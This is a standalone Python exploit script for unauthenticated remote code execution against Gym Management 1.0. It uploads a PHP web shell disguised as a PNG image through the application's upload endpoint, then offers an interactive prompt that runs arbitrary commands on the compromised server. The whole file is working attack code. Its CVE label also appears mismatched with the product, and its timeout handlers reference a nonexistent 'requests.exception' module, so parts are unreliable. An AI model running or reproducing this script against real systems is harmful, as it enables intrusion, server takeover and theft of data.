import requests, random, string, sys


if len(sys.argv) != 2:
    print("* CVE-2019-16113 | Gym Management 1.0 unauthenticated RCE *\n")
    print("Usage: python3 exploit.py <target>")
    print("Example: python3 exploit.py http://10.10.10.10")
    sys.exit()


target = sys.argv[1]
shell = '<?php echo shell_exec($_GET["rce"]); ?>'


def gen_random_charset():
    """
    This function is used to create a random charset.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10))


session = requests.Session()

def upload(target):
    """
    This function is used to upload the shell.
    """
    shell_name = gen_random_charset()
    upload_path = f"{target}/upload.php?id={shell_name}"

    file = {'file': ('shell.php.png', shell, "image/png", {'Content-Disposition': 'form-data'})}
    data = {'pupload': 'upload'}

    uploaded = f"{target}/upload/{shell_name}.php"

    try:
        upload = session.post(url=upload_path, files=file, data=data, verify=False, timeout=30)
        if upload.status_code != 200:
            sys.exit(f"Uploading {shell_name} failed, exiting.")
        else:
            print(f"Shell has been uploaded: {uploaded}")
            print(70 * '-')
            while True:
                try:
                    params = {'rce': input("Shell> ")}
                    command = session.get(url=uploaded, params=params, verify=False, timeout=30)
                    print(command.text)
                except requests.exception.Timeout:
                    sys.exit(f"[ - ] Timeout error, unable to connect to {target}")
    except requests.exception.Timeout:
        sys.exit(f"[ - ] Timeout error, unable to connect to {target}")


upload(target=target)
